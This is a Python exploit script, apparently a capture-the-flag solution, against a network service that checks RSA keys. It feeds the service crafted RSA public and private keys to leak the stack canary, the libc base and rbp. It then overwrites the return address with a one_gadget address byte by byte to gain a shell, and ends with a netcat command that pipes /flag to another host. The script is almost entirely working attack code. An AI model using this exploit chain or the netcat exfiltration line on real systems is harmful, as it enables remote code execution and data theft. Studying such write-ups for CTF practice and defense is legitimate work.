import telnetlib
import struct
import gmpy2, os, subprocess
from Crypto.Util.number import *
from Crypto.PublicKey import RSA

host = 'challenge'
port = 12345

# for test
# host = 'localhost'

tn = telnetlib.Telnet(host,port)
s = tn.get_socket()

# The public key should be small enough not to overflow the stack.

"""
while True:
  p = getPrime(256)
  q = getPrime(256)
  n = p*q
  if len( bin(n)[2:] ) == 512: break
e = 65537
d = inverse(e, (p-1)*(q-1))
r = RSA.construct(map(long, (n,e,d)))
pub = r.publickey().exportKey(format='PEM', pkcs=8)
p = subprocess.Popen("openssl rsa -pubin -RSAPublicKey_out".split(), stdin=subprocess.PIPE,stdout=subprocess.PIPE)
pub = p.communicate(pub)[0]
print "public key generated"
print pub
"""

pub = """-----BEGIN RSA PUBLIC KEY-----
MEgCQQCmfn84zVIlthyKjN2fXFufRJkK49gvG6gTlIKS7INShgxrx+mMuGuqFibg
Ku7JN4TJO/c8edZiMT5p4lAZM/pVAgMBAAE=
-----END RSA PUBLIC KEY-----"""
n = 8720005077219872334922290270422039398296727283707265258300271818390094270761882510011897080228666368697677674476657167862825383743023636557189490089917013
e = 65537
d = 185345180166429378252693140465659106792000566187103781143663558646526409801654659791754770239850427551568299728899158699845727122569236324574892450202913
r = RSA.construct(map(long, (n,e,d)))

# We pre-compute 4608-bit RSA public key. We know the upper byte is "I..." so we do not need to worry about the error "data greater than mod len".

"""
while True:
  p = getPrime(2304)
  q = getPrime(2304)
  n = p*q
  if len( bin(n)[2:] ) == 4608: break # 4096 + 64*8
e = 65537
d = inverse(e, (p-1)*(q-1))
r = RSA.construct(map(long, (n,e,d)))
priv = r.exportKey("PEM")
print "private key generated"
print priv
"""

priv = """-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""

pr = RSA.importKey(priv)

# "Decrypt" the stack until the secrets leak out.

while True:
  tn.read_until("key:")
  tn.write(pub + ".\n")

  tn.read_until("key!")
  tn.write(priv + ".\n")

  q = ""
  while True:
    q += s.recv(1)
    if "continue?(y/n)" in q: break

  q = q.split("complete.\n")[1].split("\ncontinue?(y/n)")[0]

  print len(q)
  if len(q) >= 576:
    buf = pr.encrypt(q,"")
    print repr(buf)
    state = buf[0]
    break
  tn.write("y\n")

print "[+] canary & libc leaked!"
libc = struct.unpack("<Q",state[-8:])[0] - 0x21b97  # Ubuntu 18.04.03 LTS
rbp = struct.unpack("<Q",state[-48:-40])[0]
canary = struct.unpack("<Q",state[-56:-48])[0]
print "[+] libc = 0x%x" % libc
print "[+] canary = 0x%x" % canary
print "[+] rbp = 0x%x" % rbp

tn.write("y\n")

# Private key was pre-computed. Large n is needed to avoid the error "data greater than mod len".

"""
p = 1 << 2048
p -= 1
while True:
  if gmpy2.is_prime(p):break
  p -= 2
q = p-2
while True:
  if gmpy2.is_prime(q):break
  q -= 2
n = p*q
e = 65537
d = inverse(e, (p-1)*(q-1))
r = RSA.construct(map(long, (n,e,d)))
priv = r.exportKey("PEM")
print "private key generated"
print priv
"""

priv = """-----BEGIN RSA PRIVATE KEY-----
MIIJKgIBAAKCAgEA////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
///////////////////////////////////v/AAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8apsCAwEA
AQKCAgAGcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5
jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5
jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5
jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5
jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5jQZy+Y0GcvmNBnL5
jQZy+Y0GcvmNBnL5jQZy+Y0GcvklsChP17AoT9ewKE/XsChP17AoT9ewKE/XsChP
17AoT9ewKE/XsChP17AoT9ewKE/XsChP17AoT9ewKE/XsChP17AoT9ewKE/XsChP
17AoT9ewKE/XsChP17AoT9ewKE/XsChP17AoT9ewKE/XsChP17AoT9ewKE/XsChP
17AoT9ewKE/XsChP17AoT9ewKE/XsChP17AoT9ewKE/XsChP17AoT9ewKE/XsChP
17AoT9ewKE/XsChP17AoT9ewKE/XsChP17AoT9ewKE/XsChP17AoT9ewKE/XsChP
17AoT9ewKE/XsChP17AoT9ewKE/XsChP17AoT9ewKE/XsCnV4QKCAQEA////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
///////////2EQKCAQEA////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
///////////////////////////////////////56wKCAQEAxrg5R8a4OUfGuDlH
xrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlH
xrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlH
xrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlH
xrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlH
xrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlHxrg5R8a4OUfGuDlH
xrgxkQKCAQEA7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQ
HO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQ
HO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQ
HO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQ
HO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MQ
HO/jEBzv4xAc7+MQHO/jEBzv4xAc7+MKaQKCAQEAo9Rhn2pzRyPUYZ9qc0cj1GGf
anNHI9Rhn2pzRyPUYZ9qc0cj1GGfanNHI9Rhn2pzRyPUYZ9qc0cj1GGfanNHI9Rh
n2pzRyPUYZ9qc0cj1GGfanNHI9Rhn2pzRyPUYZ9qc0cj1GGfanNHI9Rhn2pzRyPU
YZ9qc0cj1GGfanNHI9Rhn2pzRyPUYZ9qc0cj1GGfanNHI9Rhn2pzRyPUYZ9qc0cj
1GGfanNHI9Rhn2pzRyPUYZ9qc0cj1GGfanNHI9Rhn2pzRyPUYZ9qc0cj1GGfanNH
I9Rhn2pzRyPUYZ9qc0cj1GGfanNHI9Rhn2pzRyPUYZ9qc0cj1GGfanNHI9RbRA==
-----END RSA PRIVATE KEY-----"""

# "Encrypt" the stack by the public key to write the return address and canary byte-by-byte.

pos = 0x21e
one_gadget = libc + 0x4f322
target = state[-56:-40] + struct.pack("<Q",one_gadget)
data = "If you see this message, your RSA key is valid!\x00"

while True:
  m = bytes_to_long( (data + state)[0:pos] )
  n = (1<<(pos*8))-1
  q = target[23-0x21f+pos-1]
  while True:
    qq = long_to_bytes(pow(m,65537,n))
    if qq[-1] == q: break
    n = n - 2

  state = long_to_bytes(pow(m,65537,n))
  print "n: %d bits" % len(bin(n)[2:])
  r = RSA.construct(map(long, (n,e)))
  pub = r.publickey().exportKey(format='PEM', pkcs=8)
  p = subprocess.Popen("openssl rsa -pubin -RSAPublicKey_out".split(), stdin=subprocess.PIPE,stdout=subprocess.PIPE)
  pub = p.communicate(pub)[0]
  print "writing chr(%x)" % ord(q)
  tn.read_until("key:")
  tn.write(pub + ".\n")

  q = tn.read_until("key!")
  #print q
  tn.write(priv + ".\n")

  tn.read_until("continue?(y/n)",2)
  pos = pos - 1
  if pos == 0x208: 
    tn.write("n\n")
    break
  tn.write("y\n")

print "Shell time!"
import time
time.sleep(1)
# for test
# tn.write("ls -l\n")
# print tn.read_until("none",1)
tn.write("cat /flag | nc flag-submit 1337\n")
exit(0)
